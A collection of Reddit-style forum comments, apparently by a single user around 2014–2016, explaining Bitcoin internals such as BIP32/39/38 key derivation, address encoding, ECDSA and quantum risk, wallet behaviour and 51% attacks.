bitcoin-qt currently downloads the blockchain mostly sequentially and verifies each block as it comes through, which isn't terribly efficient. You can see this from the progress indicator which says 'processed block x of y' rather than just an overall percentage done.
Torrents can download many arbitrary parts of the file independently and allows for much greater parallelisation since order isn't important.
The good news is that bitcoin-qt 0.9 has some major improvements that will make the blockchain download much faster. It downloads the blockchain headers first, verifies them, and then starts filling in the block data in a more torrent-like fashion.

I don't think "lost" funds should or will ever be redistributed. The question of how to distribute is just too contentious. Giving it to miners doesn't seem fair. Redistributing equally to all funded addresses would be fairer, but that would have the same end result as simply destroying it/making it unspendable.
As for expiring old coins, that's also controversial. If ECDSA is ever compromised and we move to a different crypto scheme, I think an argument could be made for eventually invalidating any funds that weren't moved within a certain timeframe. Personally I think it's reasonable to expect people to keep up to date with major developments in the Bitcoin world from time to time. But others would consider the idea outrageous, so the problem will be achieving consensus.

Without 2FA, they could have downloaded your wallet only knowing your wallet id (maybe from your email?), and then brute forced it offline. 10 char password is semi-decent if it's random, but you say it was weak so I'm guessing it wasn't a great password.

Yes and yes.
Edit: I may have misinterpreted what you meant with the second part. See response. It would be a single transaction with two inputs

Basically they have the concept of "prime controllers" that get a bigger staking reward than everyone else. The public keys of these privileged nodes are in the code, basically saying `if address == prime then multiply reward else give normal reward`. Normal reward is 5%, prime controllers get between 10% and 350% depending on the type.

You don't need to manually create a new address. As soon as a receiving address receives a transaction, Mycelium will move on to the next address in the sequence and that's what will show on the Balance tab. What you did was add a whole other account.
If you want to see all the addresses in an account: Accounts tab -&gt; select the account -&gt; Show Unspent Outputs (should be top right).

Well it's better than nothing, but compared to BIP38 it's pretty weak.
There's no key stretching, so it's only safe if you use a really good password. BIP38 uses Scrypt which slows down brute forcing immensely and makes even relatively basic passwords hard to crack.
Also Blowfish is an interesting choice. AFAIK it has no known serious weaknesses, but even its [creator recommends using something else]( BIP38 uses AES encryption which is more widely used and reviewed.


Personally I'd stick with BIP38. It's a well-documented standard, not that hard to implement in code and is supported by several wallets and tools like bitaddress.org

They have an "Estimated BTC Transacted" for each transaction, where they basically try to make an educated guess which output is the "real" payment and which is change. 
For some transactions it's very obvious e.g. if one output address is the same as an input address, it's likely it's change so the other output must be the amount transacted. Whole or nicely rounded amounts are also more likely to be the payment amount.
They may also use taint analysis to infer connections between addresses.
It all seems to fall apart when there are more than 2 outputs though e.g. 
It's not particularly accurate, and will only get less accurate as anonymising tools like CoinJoin become more widespread.

I noticed that going from the top, it's all single arrows until it reaches a threshold of about 500 blocks into the past, and then it's all split arrows. So maybe it represents a confidence level? Split arrows are resolved forks; straight arrows are "active" forks that could theoretically still be reorganised. Though a block height of ~500 seems pretty arbitrary and overly cautious if this is what they're trying to say.
Dunno .. it's the best I've got :)

Gyft will allow just about anyone to be a reseller. I've used their API before, signed up and pretty much got approved instantly.

If you break it down into its parts, there's nothing really new in Bitcoin. ECDSA, SHA2, P2P networking, blockchains, hashcash proof of work etc were already used in various forms long before Bitcoin came along.

It was proven a loong time ago to be a Bitstamp address by multiple people receiving Bitstamp withdrawals directly from it e.g.  and also its close association with the Bitstamp's proof of reserve address that you linked.
Blockchain detectives need better training, and the first lesson should be **don't treat blockchain.info address tags as evidence**. Tags can be added by anyone.
bc.info has two types of tags: 
1. [a signed message using the private key]( These are legit.
2. [A link to a website that mentions the address]( These tags are pointless and prove nothing. This is how the 1Drt address was tagged. It was a link to  which is now a dead link.
The only reason 1Drt was ever suspected of being a Mt Gox address is because some genius blockchain detective noticed it had a Total Received amount roughly the same as the total coins missing.

Electrum never sends the master public key to the server. It just asks: give me the transactions for address 1, address 2 ... etc so the server only knows about addresses you're currently using. The calculation of addresses from the master key is done client side.
myTREZOR just sends the master pubkey to the server and the backend works out all the addresses, which means the server knows all of the addresses in your wallet now and into the future.

Well it's not really a BTC thing. Paycoin is based on Peercoin, which itself is based on Bitcoin but uses Proof of Stake instead of Proof of Work (minting vs mining).
In Bitcoin terms, imagine there was a rule in the code that said: if the block was mined by Ghash.io then allow a 1750 BTC block reward instead of 25 BTC. That would seem a little messed up and unfair right? Ghash.io gets a reward 70x bigger than everyone else‽ That's effectively what Paycoin is doing by granting some minters up to 350% minting reward (kind of like interest) while everyone else only gets 5%.

Mining work must:
1) produce something of 'value' within ~10 minutes
2) be able to scale/adjust as miners join and leave the market
3) be NP-complete i.e. hard to compute, impossible to fake, but easy to verify
4) not be able to be done in advance. You need to prevent stockpiling of pre-computed results. The proof of work needs to also contain proof that the work was done right now and against the transactions waiting to be included in the block
5) never end. If you do something like protein folding, what happens when the search space is completed? When a cure is found? I guess there's always more problems to move on to, but each time a major breakthrough is encountered it would be a disruptive event
These are just some of the properties that I could think of now, there are no doubt more. If you can find something 'useful' that satisfies these then you'll be on to something.

@_date: 2014-01-15 23:50:39
You can attempt to do it at 20, 30, 40%. We've already seen runs where ghash.io got 6 blocks in a row for example. But they didn't know beforehand they were going to get lucky, that was only obvious after the fact. It's hard to take advantage of such a situation if you don't know when it's going to happen. Eventually your luck will run out, the lie will be revealed and the blockchain will correct itself. 
The difference with &gt;50% is that you can maintain the lie indefinitely. You have more power than the rest of the network, so you can continue to build on top of your own blocks completely ignoring the rest of the network. Other miners will mine blocks, and they will be accepted for a while, but if the &gt;50% miner keeps building their chain, it will eventually outpace the rest of the network and all those other blocks will be orphaned. The evil miner can effectively steamroll over the top of everybody else's blocks. With Bitcoin, the longest chain wins (technically the chain with the most 'work'). At &gt;50% it's a mathematical certainty that you can outpace the rest of the network over the long term, and the amount by which you exceed 50% only affects how quickly and consistently you can do it.
That's why the &gt;50% is so significant. It's a very real threshold, not just some number made up by scaremongers. As for if or why somebody would ever do this, that's a different discussion.

Electrum 2.x has a checksum, it's just done differently to BIP39. The seed must start with 0x01, everything else is thrown away. But according to [this]( they actually start with 136 bits of entropy which results in 135 bits effectively after checksum and stretching is taken into account. New Electrum seeds are usually 13 words so I guess it makes sense.
Electrum 1.x had no checksum, but the wordlist was smaller so still ~128 bits.

Well the default mode (not advanced) is completely unsafe in that the site will know your key and you're trusting them completely. Defaulting to that mode with no explanation of the risks involved sets off major alarm bells.

But I think you're accidentally correct: there was a bug in the validation function that was comparing the UTF-8 representation of the checksum bytes (via the default toString()), and that conversion does suffer from the problem. Some byte arrays, if they only differ slightly at the end, produced the same UTF-8 string. It has been fixed to compare the hex string instead.

BIP39 mnemonics support a password, which effectively works like an extra word. So you can store the 12 or 24 word phrase somewhere relatively safe, and keep the password somewhere else (like in your head). I know Trezor supports this, but I don't think Ledger does.
This option also lets you have hidden wallets with plausible deniability e.g. keep a smallish amount on the wallet derived from the phrase without the password, but keep your main stash on the wallet with the password.
Note that the key stretching algorithm isn't as strong as the one used for BIP38, so you should use a decent password to prevent brute forcing.

Unfortunately no. BIP39 with the optional password only uses PBKDF2 with fairly weak parameters (only 2048 rounds), so you would want a stronger password compared to BIP38. How much stronger is hard to quantify.
PBKDF2 was chosen because BIP39 was created by the Trezor devs and Scrypt would be too resource intensive to run on an embedded device like that.

Because the fee is driven by the size of the transaction in bytes, and has nothing to do with the amount transferred.

That's exactly what they're talking about. BIP39 (the thing that defines how the recovery mnemonic works) allows for a passphrase to protect the seed. You can write the 12/24 words down and they'll be useless without the passphrase, assuming it's a strong enough.

Generally, no. Each wallet usually has its own wallet file format.
Some deterministic wallets (ones that use 12/24 word seeds) are compatible with each other, particularly if they support BIP39 and BIP44 e.g. Trezor, Mycelium. But there there are wallets like Electrum that do things slightly differently and aren't compatible.

No it just means the number that the address represents (known as the hash160 value) happens to have one or more zeros at the start of it, which are truncated during conversion to base58.
33 characters isn't *that* rare. About 4%. It drops off rapidly after that though. The vast majority are 34 or 33.
The hash160 value `0000000000000000000000000000000000000001` encodes to address `11111111111111111111BZbvjr` which is 26 characters.

Not sure how you came to that conclusion. is right in saying that you would need the actual public key. An address is a hash of the public key and on its own is useless when it comes to signing/verifying and encrypting/decrypting. It just doesn't contain enough information for that. This is why the public key is published along with the signature in transactions, it's not possible to verify a signature with only an address.

It really isn't the same thing at all. In RSA the encryption and signing algorithms are very similar, but that doesn't extend to ECDSA. There's no part of ECDSA that could be considered encrypting/decrypting, hell even signing vs verifying in ECDSA look nothing alike. 
With ECC the private and public keys are completely different and can't be reversed in any meaningful sense (prv is a number, pub is a point) so most of the ideas you might have about RSA just don't apply.
Having said that, there are ways of using an ECC keypair to encrypt. ECIES is one example, but it's a hybrid scheme where ECC is only used to derive a shared key and the actual encryption is AES or another symmetrical cipher.

No you're right. Due to the pigeonhole principal, for each address there would be on average 2^96 private keys that unlock it: 2^256 / 2^160 = 2^256-160 = 2^96
But that's not a problem because 2^160 is still sufficiently enormous that it remains safe from brute force. The fact that there are multiple possible keys doesn't make the job of searching a 160-bit keyspace any easier.
People who say Bitcoin has 256-bit security are mistaken (including that infamous image of the sun). In fact 256-bit elliptic curve crypto has effective security of 128-bits, but it's still sufficient.

GPG uses RSA which is an asymmetric/public key encryption scheme. Compared to symmetric encryption, public key crypto generally needs much bigger keys to achieve the same level of security. This is because there's a mathematical relationship between the public and private keys and there are certain algorithms that provide shortcuts to break this relationship faster than simple brute force. Bigger keys are used to offset this and hedge against future weaknesses.
For RSA, 2048-bit keys provide 112-bit equivalent security, 3072 for 128 etc. 
Elliptic curve crypto (ECC) is similar, but the key size difference is only double. Bitcoin uses 256-bit keys which provides 128-bit effective security (if the public key is known).
Now you might be tempted to think that a 128-bit seed only provides 64-bit security. But at this point the seed is not affected by the properties of public key crypto, it's just a big random number. Before ECC comes into play, the seed is fed through a key stretcher/HMAC which effectively scatters it into a 256-bit keyspace. Assuming this step produces unpredictable output (a fairly safe assumption given it's based on SHA2), then an attacker would still need to brute force against the seed's 128-bit keyspace, which is considered safe for the foreseeable future.

Uncompressed keys exist only because of historical reasons and backwards compatibility. It was either an oversight, or Satoshi was unaware of the existence of compressed keys when the first version was released. They were added in bitcoin-qt 0.6 (a long time ago) but a lot of wallets e.g. blockchain.info have lagged behind.
Compressed keys save 32 bytes per transaction input. It doesn't sound like much, but a lot of transactions are less than 300 bytes so it's a significant percentage saving with no cost.
The only disadvantage is so negligible it's barely worth mentioning. Working with compressed public keys requires an additional step to calculate the y-coordinate, but it's a trivial computation and only needs to be done once.
@_date: 2015-08-04 20:36:57
The scriptsig is the part of the transaction that contains the cryptographic proof that you're allowed to spend the funds. bc.info isn't checking that, and will accept transactions signed with the wrong private key into their pool of unconfirmed transactions.

Transactions themselves do not have timestamps, and the order of transactions within a block is arbitrary so it's not possible to tell just from block data.
But some APIs do store the time the transaction was first broadcasted to them, with varying levels of accuracy/reliability. Looking at BlockCypher's transaction API, I see two fields:
    "confirmed": "2014-03-29T01:29:19Z",
    "received": "2014-03-29T01:29:19Z",
Is the received field not what you want?

The output of RIPEMD160 is a 160-bit number i.e something between 0 and 2^160 - 1. It's not ASCII or any particular character set, that is irrelevant at this point.
Base58check is merely a way of encoding that number into a "friendlier" format that is shorter, excludes easily confused characters etc. It also adds a checksum.

The signature is a function of the input's private key and the hash of the transaction (which includes the output(s)). If a miner modifies an output, the hash will change and will no longer match the signature. They can't just create a new signature for the modified transaction hash because that would require knowing the private key for the input, which only the sender knows.

Impossible to say exactly how much has been lost via burn addresses. As to why, I think you should have enough answers from the post you made :)
Someone has estimated burned BTC here:  at over 2000 BTC.
I would guess lost keys would account for much more than that. I suspect a large proportion of early block rewards will remain forever unclaimed because a lot of people treated it as play money/experimentation back then and didn't bother to backup.
In terms of provably lost coins, that's easy to calculate. As at block 367054, the total supply should be 
    (210000 * 50) + ((367054 - 210000) * 25) = 14,426,350
But the total of the unspent output set is currently 14,426,214.7666798 (via the gettxoutsetinfo RPC command)
So 135.2333202 of the expected supply is provably lost, either from unclaimed block reward or provably unspendable outputs (OP_RETURN).

That wording implies that knowledge of one key conveys information that can be used to find the next or previous key which isn't the case for any deterministic scheme in wide use. Keys are derived from the root key plus an index.

It can be in an ideal world, but doing so exposes you to some mostly theoretical risks (e.g. quantum computing, elliptic curve crypto flaws). The risks are hard to quantify. The extra step of hashing the public key give an additional layer of protection.

Not necessarily. Large pools most likely run clustered servers, and the instances could be out of sync. 
But the more likely explanation is NTime rolling. The nonce value is only 32-bit integer which has a range that's exhausted pretty quickly with today's hash power. So when the nonce overflows you need to change something in the block header and start again. Timestamp is often the easiest thing to change.

Yes it's safe. The kind of brain wallets they're talking about are where you take a password or phrase e.g. from a book or "randomly" from your mind, and create a private key from it. These keys are often low entropy and subject to dictionary attacks.
Trezor works in the opposite way. It creates a random 256-bit key, and then encodes it into words. Nobody is going to be cracking a 128-bit key let alone 256-bit. It's not subject to dictionary attacks even though it is made up of words. It's simply a huge number displayed as words instead of digits.

Logarithm is effectively the inverse of exponentiation.
So say we have b^y = x

The "b" in logb should be subscript but you can't do that on Reddit. If the subscript is missing it's implied to be log10.
So log(1000) = 3 because 10^3 = 1000

Both transactions should confirm quickly if:
1. the miner implements child-pays-for-parent. I think Eligius does, not sure who else.
2. the first transaction actually propagated and made it to the miner. Zero-fee transactions are sometimes not relayed at all.
3. the second tx fee is large enough to cover both.
Otherwise both transactions will take a long time to confirm or never confirm at all if they drop from mempools.
@_date: 2015-08-30 11:43:16
That's correct. The data that's being signed is the SHA256 hash of the entire transaction (minus the input scripts)\*\*. If anything in the transaction is changed, it will hash to a different value and the signature will no longer match.
\*\* That's the default behaviour at least. The vast majority of transactions use SIGHASH_ALL, but there are other hashtypes that allow the transaction to be modified. SIGHASH_NONE means the outputs aren't included in the hash and can be modified by anyone. SIGHASH_SINGLE means only the output with the same index as the input is included in the signature; other outputs can be added. There's also SIGHASH_ANYONECANPAY which means inputs can be added by anyone. These are only really useful for contracts and other advanced concepts.

That particular format is unique to Armory. Other wallets like Electrum, Mycelium offer essentially the same functionality but the root key/seed is formatted differently (12 or 24 dictionary words) and the individual keys derived differently. They're not interoperable unless they implement the exact same standards (BIP32/39/44). Maybe one day they'll all agree, but for now it's a bit of a mix.


Yes, online Armory only generates addresses, not keys. Offline Armory generates keys but only a certain number in advance as needed. Sometimes if you use a lot of receiving addresses in the online wallet, the offline wallet will get behind and out of sync. It has no access to the internet/blockchain so it doesn't know you've used those addresses until you later attempt to sign a transaction that requires a key it doesn't yet know about. There is also a button somewhere in the wallet options that lets you manually generate more keys - not sure exactly where, I haven't used Armory in a while. \*Edit\* looks like this isn't as obvious as it used to be. You need to be in *Expert Mode*, then go to *Wallet Properties* and click on *Addresses Used*

The problem with TLS in a post-quantum world is key exchange which is something that Lamport signatures don't help with.
There are several competing quantum-safe key exchange algorithms but it's still early days. Seems to be split between Lattice based crypto (NTRU, Ring-LWE) and Supersingular Elliptic Curve crypto (SIDH), which is basically ECC on steroids. SIDH is promising because it has the same features of ECDH like perfect forward secrecy and reasonable key sizes, but it's unproven at this point.
Once you have the session key, the encryption is symmetrical (AES) and generally considered to be quantum safe.

@_date: 2015-07-28 04:28:28
Likely to be hacked? No. Just slightly more likely.
1. When you spend, the public key of the address is published along with the signature. Your funds are now protected solely by ECDSA. If quantum computing happens or some weakness is found in ECDSA then you're at risk. Addresses that have never been spent from are further protected by SHA256 and RIPEMD160 which are comparatively safe from quantum attacks. Threat level: very theoretical.
2. If your wallet has a random number generator bug (e.g. Android in 2013, blockchain.info more recently) and produces bad signatures with non-random R values, it's possible for an attacker to derive your private key. This attack requires multiple signatures and so isn't a problem if you don't reuse addresses. The threat is real and has occurred multiple times, but *should* be rare now especially as most wallets are moving towards deterministic signatures [(RFC6979)]( that don't rely on random values.
Using multisig doesn't offer any additional protection against either points.
tl;dr if your wallet has no bugs, and ECDSA is never weakened then it's not a problem.

You're effectively halving the strength of the key from 128 bits to 64, which is getting uncomfortably close to something that could theoretically be brute forced with enough hardware and time. Not likely, and not with just consumer hardware, but 64-bit crypto has been broken.
There are much better ways to do what you want e.g. multisig, Shamir's Secret Sharing where splitting the key doesn't lead to any loss in security.
@_date: 2016-02-28 12:47:35
Almost any 256-bit number, yes. Except for a very narrow range at the top. Keys have a predictable first character when encoded into WIF/base58 format because they are prefixed with a version byte.
With compressed vs uncompressed keys, it's not actually the private keys that are compressed. In fact compressed private keys are longer. They have a 1-byte flag added to the end which indicates that the compressed form of the **public** key should be used.
An uncompressed public key contains an identifier (0x04) followed by the x and y coordinates - each 256 bits - for a total of 520 bits (65 bytes). But with ECDSA, the curve is symmetrical so it's possible to express the same information as just the x coordinate and which side of the curve the point lies on. Compressed public keys have an identifier (0x02 or 0x03 depending which side of the curve) and the x coordinate for a total of 264 bits (33 bytes). It's a simple extra calculation to work out the y coordinate from that.

There's no rational reason for choosing to do that. The protocol allows it because it only enforces a max block reward, not a minimum.

The leftover amount (sum of inputs - sum of outputs) is the fee. If you're playing around with raw transactions and somehow fuck it up, then the leftover amount goes to the miner. It's not destroyed.
I guess the "fix" would be to make the fee explicit instead deriving it, and say a transaction is invalid if the inputs and outputs don't add up to the same amount. But that would 
1. increase the size of transactions (slightly) 
2. be a change to the transaction format and consensus rules that probably would require a fork

Do you mean why was it mined? It's considered non-standard by most nodes/miners, but it's a valid transaction. If you can get it to a miner that accepts non-standard transactions (e.g. Eligius), it will probably get mined eventually.

The main advantage is that your wallet's private keys are isolated from your computer and not vulnerable to theft from trojans or other malware. The USB interface is tightly constrained and only allows a few operations like "sign this transaction", none of which allow the keys to be retrieved from the device.

Symmetric encryption and hashing (e.g. AES and SHA2) will be mostly ok. Quantum computing effectively halves their key strength, so 256-bit would become 128-bit which is still out of reach of brute force.
Public key crypto (ECDSA, RSA etc) will be completely broken, at least in theory.

There's an algorithm (Shor's) that completely breaks ECC if a powerful enough quantum computer is ever built. So far there's no equivalent for breaking hashes, only Grover's algorithm which weakens security but doesn't completely destroy it.

It's an existing OP code that's been in there since day 1, it has other uses (though not widely used currently).
As I already said, if it was removed there are other ways of achieving the same result that are much worse for the blockchain e.g. encoding the message in the address/hash160 which is not prunable and stays forever in the UTXO set.

That would be an international wire which is slow and expensive. My bank charges between $20 to $30 to send, and $15 to receive.

It was essentially a lookup service. The client would query the IP address and it would respond with the public key to send to. IP address was never anything to do with the blockchain.

People are going to store "shit" in the blockchain and there's no real way to stop them as long as they're willing to pay the required fee. OP_RETURN means shit can be stored in a way that allows people to ignore it if they don't care about it. It's provably unspendable so can be safely ignored/pruned and it also doesn't pollute the unspent output set (UTXO).
@_date: 2015-09-27 10:49:11
I think "myth" might be a bit extreme, but it is an oversimplification. The hash must be lower than the target, which usually means it has more zeros at the start but not always.
    target = 0x0000ffffff
    hash1  = 0x000000ff00
    hash2  = 0x0000eeeeee
Both hashes are valid here, even though only hash1 has more leading zeros. Hash2 is still lower than the target so it's perfectly valid.
@_date: 2015-09-12 03:28:54
The extended public key (xpub, sometimes called master public key) is just like the seed except it only lets you derive the addresses in the wallet, not the private keys. If someone knows your xpub they know all the addresses in your wallet.
A lot of wallets don't really show the xpub, but some let you export it so you can create watch-only wallets etc.
@_date: 2015-09-12 03:21:33
A single private key doesn't reveal anything about other keys. But perhaps counter-intuitively, a single private key + master PUBLIC key allows the master private key to be determined and so compromises the entire wallet.
@_date: 2015-09-12 05:25:26
AFAIK, Electrum and Mycelium only send individual addresses. In terms of privacy that's pretty much the same though. They know all your in-use addresses, but not future addresses. The myTREZOR web wallet does send the xpub to their backend server though. Possibly some other HD wallets do the same.
If you mean normal SPV nodes as in Bitcoin Core, they only operate on addresses, they have no concept of HD wallets. The addresses are also obscured using a bloom filter for privacy, but that's apparently not as effective as originally thought, at least not with the parameters most SPV wallets use.

Concatenate all these values together to get the block header. But we need to use little-endian format which means reversing the byte order of each value. This gives us:
**03000000**0dff7d7493ed0baa6309b92f58547b2a10c378c466328d0e0000000000000000**0f4e07f5f58871be4e95d79128487e989d09a76bd94243e796144f56c07da336**355f0756**ba871218**908f8240 (bold to highlight each value)
Double SHA256 of that gives:

They've had 3 major RNG issues that I'm aware of, excluding the Android SecureRandom bug in 2013 since that wasn't really their fault and they weren't the only ones affected.
Around the same time as the Android bug, there was a R-value bug in the web wallet. 
In December 2014 a major web wallet bug led to loss of &gt;200 BTC, most of which was returned by whitehat hacker Johoe. This was mostly an R-value problem, but also affected keys generated during the vulnerable period.

Yes it was dumb, but not quite as much as you'd think. The random.org entropy was supposed to be mixed into the device-supplied entropy, and provide just a bit of extra entropy. But on a small number of devices, instead of mixing it replaced the entire entropy pool. I don't know if it was ever determined exactly which devices, or which series of events lead to this rare behaviour. I couldn't directly replicate it on any of my devices at the time.
But yeah, definitely some bad coding there. Too many assumptions and not enough defensive coding ultimately lead to tears.

I'm not following your reasoning, or you're not understanding the technical issues involved.
Arbitrary information can be encoded into addresses. And when that happens the outputs are unspendable but not provably so, and can't be pruned. You want to remove an option that would force people back to doing it that way, which is bad for everyone.
It's harm minimisation. Pragmatism over idealism.

Yes you can only say with *certainty* that it's 2^96 on average. However a property of a good hash function is that its output is uniformly distributed. It's very unlikely that SHA2 and RIPE would deviate far from the mean, otherwise they would be bad hash functions prone to collisions. But uniformity can't be proven, it can only be tested empirically and so far we haven't found any obvious weaknesses.

Didn't catch your edits before I posted.
BIP39 says nothing about keys, it's just about generating a seed which happens to be 512 bits long because that's the output of pbkdf2-hmac-sha512. Deriving keys from the seed belongs to BIP32. You kind of need to understand both for it to make sense.

BIP39 is one implementation of the first bullet point.

No commits for a year, so development has stalled and it's pretty much abandoned at this point. And it's very much an alpha product, so in that sense it's not at all safe to use.
The ideas behind the privacy features are sound (Coinjoin, stealth addresses) but may or may not be implemented correctly. AFAIK nobody has seriously audited it because it's still unfinished. And there are potentially better methods that have come out since then e.g. Coinshuffle, Joinmarket, BIP47, but wallet support isn't there yet.

For any two address QRs, there will always be some common data e.g. the parts that define the QR encoding parameters used, padding bytes and the fact that all addresses start with 1.
In the raw data for the two addresses you posted, out of 55 bytes the first 3 and the last 19 (padding) are exactly the same which is about 40%. 
So why does your third QR look completely different despite probably having that same common data? If there are too many dots or gaps clumped together it can be difficult for a scanner to decode. You want the dots to be distributed as evenly as possible. So there are masks that are applied to mix the data up and spread it out so it's easier to scan. It basically flips the colours in [8 well-defined patterns]( and it's up to the encoder to choose the best mask for the given data. The two codes you posted happen to use the same mask, and would look very different otherwise.
Here's another address that uses the same mask: 
These similarities are also more likely to be visually apparent on bc.info because they use the lowest error correction (L) vs blockr.io using the highest (H), so there's less redundancy.
@_date: 2015-11-04 14:44:20


Yep, on average. Depending how perfect the hash distributions are, some addresses might have more or less. From what we know about SHA2 the distribution should be pretty smooth.


This. It's 2^96 keys buried in a 2^256 space which boils down to 1 in 2^160. 160-bit is far outside brute forcing for near eternity.

Electrum waits for a few confirmations before it considers a change address as "used".

Because the limited interface would make it too tedious/slow for most users. I actually asked the same question when it was released, and suggested something like how you enter your initials on an old arcade game highscore screen.

Yes that's pretty much it. The 33 or so bytes that are different represents the actual address data (makes sense since addresses are usually 33 or 34 characters long). But QR codes store data in blocks of a certain size, and the standard says if the data isn't a neat fit you need to fill in the remainder with padding bytes (that's the ec 11 ec 11 crap you see at the end).
@_date: 2015-11-12 01:33:03
The Trezor xpub is at the account level `m/44'/0'/0'` but that site is showing one level deeper. That xpub would be the for the receiving addresses only `m/44'/0'/0'/0` and wouldn't include change addresses `m/44'/0'/0'/1`
So if you go to the BIP32 tab and enter `m/44'/0'/0'` you should get the same xpub as Trezor is showing for the account.

24 words represents 256 bits of entropy, but HMAC-SHA512 stretches it out to 512 bits. Half of this becomes the master private key, and the other half is the chain code (which is shared between all child keys)

It's a lottery, but some people have more tickets.
@_date: 2015-11-04 03:04:16
Private keys are 256 bits long, but in practice the keyspace is 2^160 because addresses are a 160-bit hash of the public key. This effectively compresses the 2^256 keys into a smaller space and it means on average an address has 2^256-160 = 2^96 valid private keys. 
2^160 is still unfathomably large.
@_date: 2015-11-01 19:35:16
Well if you're not worried about compatibility with other wallets, child key derivation and other features of BIP32/39 you can pretty much do whatever you want. You could simply treat the mnemonic as a brain wallet phrase and just pass it through basic SHA-256.
Not entirely sure what your objective is.
Looking at the IndieSquare code, what they do isn't totally standard. Instead of BIP39 they use [MnemonicJS]( which is more like the old Electrum mnemonics (1626 words). Then they create a BIP32 master key and use the path `m/0'/0/0` as the "account" key and address.
@_date: 2015-11-12 02:37:22


That's for the receive keys only. The account xpub is one level up the same as Trezor.
Electrum doesn't use BIP44, it's just m/0/i for receive addresses and m/1/i for change, so the whole wallet is simply m. Effectively a whole Electrum wallet xpub/xpriv maps to a single account in Trezor/Mycelium, so you can cross import/export them.

From the sender's point of view, would that matter? They don't care who gets the reward as long as the tx is sent. Miners who also listen would just have an advantage over non-miner listeners, since they can guarantee that their transactions win for any blocks they mine.

I'm saying if you search say the first 160 bits of the 256-bit keyspace (or any 160-bit sized part of it), chances are you're going to find a key for a particular address, or a key for the vast majority of the 2^160 addresses if that's your aim. Because you're not looking for 1 key, you're looking for any of the 2^96 keys that unlock an address *at once*.
To reword it: Each address has on average 2^96 private keys that unlock it (pigeonhole principle). Assuming good distribution of these keys across the 256-bit keyspace, the vast majority of addresses are going to have one of their keys in the first 160 bits of the keyspace.

So you didn't:
1. write just 1 character wrong
2. swap 2 adjacent characters

That transaction isn't stuck, it has 230 confirmations. Unspent just means the funds are still at the original address, haven't been spent yet.

~~Alternatively the business database could be included in the app or downloaded once and the lookups are all client side. The database wouldn't be that big.~~
Edit: looked at the code, they do actually make API calls for the business lookup, so they could log your location if they were that way inclined.

That sucks. If you don't mind me asking, how much was lost? If it's a lot, it may be worth using a professional data recovery service.
When you ran the recovery tool, did you happen to keep what it printed to the output? The keys/addresses that it showed. You could look up some of the addresses on a block explorer to see if they contain a balance.
If all else fails, as a last ditch attempt I'd be happy to take a look at the recovered wallet to see if I can extract anything from it.

This is true. The transaction that funded that address used pay to pubkey, not pay to pubkey hash (as did most block rewards up until as recently as 2012).

His example didn't convert properly between base58 strings and bytes/hex.
Here's a working example using the Bitcore library, which is cheating a little: 
Under the hood, here's what has to happen:
Take your base string e.g. 1MikesAppGameWinner123456 and pad it out to 34 characters
    
    1MikesAppGameWinner123456XXXXXXXXX
Convert the base58 string to byte array/buffer/hex (whatever your crypto library works with). Base58 is a Bitcoin-specific thing, you won't find it in any standard crypto libraries.
    00e3480279a329f91524ea33b12a1763c20aecef7bf45a70f2

    694c0988c6d61d99648bf3b889ab6e75e7d64ef047cf129d101a8ba99e1a34cd
Take the first 4 bytes `694c0988` and append to the address bytes

Yes so using your example, the TREZOR is effectively the air-gapped PC. But the problem is that it lacks an effective interface to enter the seed when restoring (tiny screen, only two buttons). So they traded some security for convenience and provided a way to restore via PC that is still relatively secure. And now with the new advanced method it's totally secure but somewhat more tedious to perform.

No, but neither is P-384. Elliptic curve crypto in general is not quantum safe.

The announcement is just a heads up that one day in the semi-near future they'll be migrating to a quantum resistant suite, and people who haven't already updated to Suite B probably shouldn't bother since it's likely not worth the cost at this point.

The default TREZOR recovery is randomised because you need to enter the words on your PC which is a security risk. So after restoration, any trojan/virus could potentially know your mnemonic words but not the order. For a 24-word mnemonic, there are 24! combinations which is pretty huge, but still significantly less than the seed entropy.
They've recently added an improved recovery method that doesn't require typing the words. It's a bit slow and painful, but it's the safer option. And it's not like you would be restoring that often anyway.

Minor nitpick, but there's a difference between a public key and a Bitcoin address. The relationship between privkey to pubkey is always 1-to-1. But a Bitcoin address is a 160-bit hash of the pubkey, which effectively compresses/shortens it. Because of this, there will be multiple keypairs for each address (see [Pigeonhole principle]( 
How many privkeys for each address on average? 2^256 / 2^160 = 2^256-160 = 2^96. It sounds like a lot, but the fact that there are 2^160 possible addresses means it's not an issue. It's just not feasible that you'll ever find a collision.
@_date: 2015-10-22 16:59:02
Yes, that's giving an example of something that Grover's algorithm can be applied to, but it only gives a quadratic speed-up.


i.e. sqrt(2^256) = 2^256/2 =  2^128. Simply double the keyspace to counteract this. This is why AES, SHA, and other non-public-key crypto is considered quantum safe.

Hard to know where the bottleneck is without seeing the code. Barring any obvious bad practices (excessive disk access, inefficient regex), it's probably just the fact that Python is an interpreted language and often orders of magnitude slower than something like C/C++ when it comes to number crunching. You're also probably not multithreading it so you're only using a fraction of your CPUs capabilities.
If you want something faster you could look at using libbitcoin (C++) or bitcoinj (Java). Or use VanityGen as a base and modify it to your needs.

It's standard behaviour in most wallets (including Core) for spending your own change outputs. Sometimes your wallet doesn't have any other outputs to spend, and waiting ~10 minutes for change from the previous transaction to confirm is pretty inconvenient.

Usually the CNC server assigns a unique address, just like it uses a different encryption key per infection. If there really are only 3 addresses, then these guys are amateurs or not in it for the money. Their income stream will soon dry up once word gets out that paying the ransom is pointless.

I don't know if you're trolling and trying to get people to waste their time, or if you're confused.

Bitcoin Core keeps a set of Unspent Transaction Outputs (UTXO). If the input isn't in the UTXO set then it has already been spent. It's generally kept in memory so lookup is fast.

It's possible to craft a transaction using various [SIGHASH flags]( so that inputs and outputs can be added by a third party even after the transaction is signed. But I can't think of a combo that would do what you need while also preventing the miner or anyone else in the relay chain from modifying the tx and claiming the bonus fee for themselves.
Best idea I can come up with is the potential broadcasters need to broadcast/publish their address somewhere, and the sender radios a bunch of transactions rewarding different broadcasters. Whoever receives and broadcasts first wins.

Some confusion here. That's not even a valid address. And if it was, it's probably his current receiving address which generally has no bearing on where the Bitcoin he sent you comes "from".
It looks like there were two transactions generated around the same time. The transactions are essentially identical, both trying to spend the same coin and so they conflict. It looks like blockchain.info does a really poor job of communicating that, and hasn't even resolved the conflict now that one of them has confirmed.
Just another reason to use a better wallet.
@_date: 2015-10-04 18:16:15
Electrum seems to handle it pretty well, maybe not ideal though. I had a chain of unconfirmed outgoing transactions that were affected. When the first transaction confirmed, it was the modified one and so my later transactions were invalid. They just disappeared completely from my wallet without any intervention. But also no notification of any kind so it was a bit confusing at first.
